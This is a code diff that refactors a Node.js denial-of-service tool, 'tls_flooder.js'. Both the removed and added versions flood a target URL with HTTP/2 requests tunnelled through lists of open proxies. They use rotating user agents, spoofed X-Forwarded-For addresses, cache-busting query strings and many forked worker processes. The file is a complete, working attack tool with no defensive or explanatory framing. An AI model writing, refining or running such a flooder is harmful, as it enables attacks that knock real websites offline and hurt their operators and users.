@@ -1,194 +1,137 @@
-const net = require("net");
-const http2 = require("http2");
-const tls = require("tls");
+// tls_flooder.js
+
 const cluster = require("cluster");
-const url = require("url");
-const crypto = require("crypto");
-const fs = require("fs");
+const fs      = require("fs");
+const net     = require("net");
+const tls     = require("tls");
+const http2   = require("http2");
+const url     = require("url");
+const crypto  = require("crypto");
 
-process.setMaxListeners(0);
-require("events").EventEmitter.defaultMaxListeners = 0;
-
-if (process.argv.length < 5) {
-    console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://site.com 60 100 5`);
-    process.exit();
+if (process.argv.length < 6) {
+  console.error("Usage: node tls_flooder.js URL DURATION SEC_RATE THREADS");
+  process.exit(1);
 }
 
-const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
-const ciphers = "GREASE:" + [
-    defaultCiphers[2],
-    defaultCiphers[1],
-    defaultCiphers[0],
-    ...defaultCiphers.slice(3)
-].join(":");
+const [targetUrl, durationSec, rate, threads] = process.argv.slice(2).map((v, i) => 
+  i === 0 ? v : Number(v)
+);
 
-const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:" +
-                 "rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
-const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
+const parsed = url.parse(targetUrl);
+const proxies = fs.readFileSync("proxy.txt", "utf-8").trim().split(/\r?\n/);
+const uagents = fs.readFileSync("ua.txt",    "utf-8").trim().split(/\r?\n/);
 
-const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 |
-    crypto.constants.SSL_OP_NO_SSLv3 |
-    crypto.constants.SSL_OP_NO_TLSv1 |
-    crypto.constants.SSL_OP_NO_TLSv1_1 |
-    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
-    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
-    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
-    crypto.constants.SSL_OP_SINGLE_DH_USE |
-    crypto.constants.SSL_OP_SINGLE_ECDH_USE;
-
-const secureProtocol = "TLS_client_method";
+// Reuse satu SecureContext untuk semua connections
 const secureContext = tls.createSecureContext({
-    ciphers,
-    sigalgs,
-    honorCipherOrder: true,
-    secureOptions,
-    secureProtocol
+  honorCipherOrder: true,
+  secureOptions: crypto.constants.SSL_OP_NO_SSLv2
+               | crypto.constants.SSL_OP_NO_SSLv3
+               | crypto.constants.SSL_OP_NO_TLSv1
+               | crypto.constants.SSL_OP_NO_TLSv1_1
+               | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT
+               | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE
+               | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
+               | crypto.constants.SSL_OP_SINGLE_DH_USE
+               | crypto.constants.SSL_OP_SINGLE_ECDH_USE,
+  ciphers:     crypto.constants.defaultCoreCipherList,
+  sigalgs:     "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
+  ecdhCurve:   "x25519:secp256r1:secp384r1",
+  secureProtocol: "TLS_client_method"
 });
 
-const proxies = readLines("proxy.txt").filter(Boolean);
-const userAgents = readLines("ua.txt").filter(Boolean);
-
-const args = {
-    target: process.argv[2],
-    time: ~~process.argv[3],
-    rate: ~~process.argv[4],
-    threads: ~~process.argv[5]
-};
-
-const parsedTarget = url.parse(args.target);
-
-if (cluster.isMaster) {
-    for (let i = 0; i < args.threads; i++) cluster.fork();
-    cluster.on("exit", () => cluster.fork());
-} else {
-    startFlooding();
-}
-
-function readLines(path) {
-    return fs.readFileSync(path, "utf-8").toString().split(/\r?\n/);
-}
-
 function randomInt(min, max) {
-    return Math.floor(Math.random() * (max - min) + min);
+  return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomIP() {
-    return `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 255)}`;
+  return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`;
 }
 
-function randomElement(arr) {
-    return arr[Math.floor(Math.random() * arr.length)];
+function randomItem(arr) {
+  return arr[Math.floor(Math.random() * arr.length)];
 }
 
-function startFlooding() {
-    const flood = () => {
-        for (let i = 0; i < args.rate; i++) runFlooder();
-    };
-    setInterval(flood, 1000);
+// Single CONNECT-through-proxy wrapper
+function connectViaProxy(proxy, cb) {
+  const [host, port] = proxy.split(":");
+  const socket = net.connect({ host, port: +port });
+  const req    = `CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\nConnection: keep-alive\r\n\r\n`;
+
+  socket.setTimeout(5000);
+  socket.once("connect", () => socket.write(req));
+  socket.once("data", chunk => {
+    if (chunk.includes("200")) cb(null, socket);
+    else            cb(new Error("proxy rejected"), socket);
+  });
+  socket.once("error",    err => cb(err, socket));
+  socket.once("timeout",  () => cb(new Error("proxy timeout"), socket));
 }
 
-class NetSocket {
-    HTTP(options, callback) {
-        const req = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
-        const socket = net.connect({ host: options.host, port: options.port });
+// Fungsi inti flooding
+async function floodWorker() {
+  const endTime = Date.now() + durationSec * 1000;
 
-        socket.setTimeout(options.timeout * 1000);
-        socket.setKeepAlive(true);
-        socket.setNoDelay(true);
+  while (Date.now() < endTime) {
+    const bursts = Array.from({ length: rate }, async () => {
+      const proxy = randomItem(proxies);
+      connectViaProxy(proxy, (err, rawSocket) => {
+        if (err || !rawSocket) return rawSocket?.destroy();
 
-        socket.on("connect", () => socket.write(req));
-        socket.on("data", chunk => {
-            if (chunk.toString().includes("200")) callback(socket, null);
-            else {
-                socket.destroy();
-                callback(null, "bad proxy");
-            }
-        });
-        socket.on("timeout", () => { socket.destroy(); callback(null, "timeout"); });
-        socket.on("error", () => { socket.destroy(); callback(null, "conn error"); });
-    }
-}
-
-const SocketHandler = new NetSocket();
-
-function runFlooder() {
-    const proxy = randomElement(proxies);
-    const [host, port] = proxy.split(":");
-
-    const proxyOptions = {
-        host,
-        port: ~~port,
-        address: parsedTarget.host,
-        timeout: 10
-    };
-
-    const headers = {
-        ":method": "GET",
-        ":path": parsedTarget.path + `?v=${Math.random().toString(36).substring(7)}`,
-        ":scheme": "https",
-        ":authority": parsedTarget.host,
-        "user-agent": randomElement(userAgents),
-        "x-forwarded-for": randomIP(),
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "accept-language": "en-US,en;q=0.9",
-        "accept-encoding": "gzip, deflate, br",
-        "cache-control": "no-cache",
-        "referer": `https://${parsedTarget.host}${parsedTarget.path}`,
-        "sec-fetch-site": "none",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-dest": "document",
-        "upgrade-insecure-requests": "1"
-    };
-
-    SocketHandler.HTTP(proxyOptions, (connection, err) => {
-        if (err || !connection) return;
-
-        const tlsConn = tls.connect({
-            host: parsedTarget.host,
-            port: 443,
-            servername: parsedTarget.host,
-            secureContext,
-            rejectUnauthorized: false,
-            socket: connection,
-            ALPNProtocols: ["h2"],
-            ciphers,
-            sigalgs,
-            ecdhCurve,
-            secureOptions,
-            secureProtocol
+        const tlsSock = tls.connect({
+          socket: rawSocket,
+          servername: parsed.host,
+          secureContext,
+          ALPNProtocols: ["h2"],
+          rejectUnauthorized: false
         });
 
-        tlsConn.setNoDelay(true);
-        tlsConn.setKeepAlive(true);
+        tlsSock.setKeepAlive(true);
+        tlsSock.setNoDelay(true);
 
-        const client = http2.connect(parsedTarget.href, {
-            createConnection: () => tlsConn,
-            settings: {
-                enablePush: false,
-                initialWindowSize: 6291456
-            }
+        const client = http2.connect(targetUrl, {
+          createConnection: () => tlsSock,
+          settings: { enablePush: false, initialWindowSize: 1 << 22 }
         });
 
         client.on("connect", () => {
-            for (let i = 0; i < 2; i++) {
-                const req = client.request(headers);
-                req.on("response", () => req.close());
-                req.end();
-            }
+          // Kirim 2 request per koneksi
+          for (let i = 0; i < 2; i++) {
+            const req = client.request({
+              ":method": "GET",
+              ":path":  `${parsed.path}?r=${Math.random().toString(36).slice(2)}`,
+              ":scheme": "https",
+              ":authority": parsed.host,
+              "user-agent": randomItem(uagents),
+              "x-forwarded-for": randomIP(),
+              "accept": "text/html,application/xhtml+xml",
+              "cache-control": "no-cache",
+              "referer": targetUrl
+            });
+            req.on("response", () => req.close());
+            req.end();
+          }
         });
 
-        client.on("error", () => {
-            client.destroy();
-            connection.destroy();
-        });
-
-        client.on("close", () => {
-            client.destroy();
-            connection.destroy();
-        });
+        client.once("error", () => client.destroy());
+        client.once("close", () => client.destroy());
+      });
     });
+
+    // Tunggu batch selesai atau timeout 1 detik
+    await Promise.race([
+      Promise.allSettled(bursts),
+      new Promise(r => setTimeout(r, 1000))
+    ]);
+  }
+
+  process.exit(0);
 }
 
-setTimeout(() => process.exit(1), args.time * 1000);
-process.on('uncaughtException', () => {});
-process.on('unhandledRejection', () => {});
+// Setup multi‐process dengan cluster
+if (cluster.isMaster) {
+  for (let i = 0; i < threads; i++) cluster.fork();
+  cluster.on("exit", () => process.exit(0));
+
+} else {
+  floodWorker().catch(() => process.exit(1));
+}
